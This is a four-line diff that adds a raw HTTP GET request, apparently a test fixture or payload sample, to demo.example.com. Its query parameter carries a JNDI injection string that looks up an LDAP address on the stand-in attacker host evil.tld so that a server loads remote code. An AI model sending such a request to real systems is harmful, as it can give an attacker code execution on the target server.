@@ -1,0 +1,4 @@
+GET /a?path="l%3DInitialContext().lookup("ldap://evil.tld/x")" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
